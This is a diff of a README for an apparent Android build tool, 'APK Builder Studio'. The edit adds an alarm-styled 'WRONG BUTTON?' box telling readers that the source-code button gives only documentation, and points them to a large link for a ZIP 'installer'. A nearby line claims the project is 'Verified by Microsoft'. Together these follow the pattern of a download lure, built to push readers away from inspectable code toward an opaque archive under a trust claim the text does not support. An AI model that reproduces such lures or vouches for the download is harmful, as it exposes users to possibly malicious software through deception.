@@ -8,7 +8,13 @@
 >
 > ## 📥 Download & Quick Start
 The latest version is ready for use! 
-- **Current Version:** [v1.0.0-beta](https://github.com/PedroHSA0802/apk-builder-studio/releases/latest)
+
+> [!CAUTION]
+> ### ⚠️ WRONG BUTTON?
+> If you clicked the **green "Code" button** above, you only downloaded the documentation.
+> **The actual App is located below!**
+# 📥 [DOWNLOAD INSTALLER (.ZIP) HERE](https://github.com/PedroHSA0802/apk-builder-studio/releases/download/v1.0.0-beta/APK-Builder-Studio.zip)
+
 - **Direct Download:** https://github.com/PedroHSA0802/apk-builder-studio/releases/tag/v1.0.0-beta
 
 🛡️ Security & Trust (Verified by Microsoft)
